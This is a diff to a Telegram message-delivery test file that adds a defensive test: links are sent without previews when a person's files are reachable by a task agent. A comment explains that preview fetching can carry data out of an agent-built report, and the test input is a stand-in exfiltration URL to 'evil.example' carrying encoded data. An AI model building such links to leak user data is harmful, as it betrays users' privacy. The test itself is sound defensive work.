@@ -50,6 +50,11 @@ vi.mock("@db/services/scheduled-agent-jobs", () => ({
   finalizeScheduledReport: scheduleDeliveryCapture.finalize,
   releaseScheduledReport: scheduleDeliveryCapture.release,
 }));
+const taskFiles = vi.hoisted(() => ({ here: vi.fn(() => false) }));
+vi.mock("@agent/lib/sandbox/pilot", () => ({
+  taskFilesEnabled: () => false,
+  taskFilesOfCaller: taskFiles.here,
+}));
 vi.mock("@db/services/channel-identities", () => ({
   findChannelIdentity: vi.fn<typeof findChannelIdentity>(),
   redeemChannelLinkToken: vi.fn<typeof redeemChannelLinkToken>(),
@@ -330,6 +335,29 @@ describe("Telegram message delivery", () => {
     expect(request.mock.calls[1]?.[1]).toMatchObject({
       text: "b".repeat(300),
     });
+  });
+
+  it("sends a link without a preview where the person's files reach the task agent", async () => {
+    // Telegram's servers would fetch the link to build a preview before the
+    // person reads it: a link a task report built carries data out unclicked.
+    taskFiles.here.mockReturnValueOnce(true);
+    const { context, request } = handlerContext();
+
+    await handleActionResult(
+      sendMessageResult({
+        kind: "message",
+        text: "Источник: https://evil.example/s?d=c2VjcmV0",
+      }),
+      context,
+      sessionContext()
+    );
+
+    expect(request).toHaveBeenCalledExactlyOnceWith(
+      "sendMessage",
+      expect.objectContaining({
+        link_preview_options: { is_disabled: true },
+      })
+    );
   });
 
   it("posts a native link as its own message", async () => {
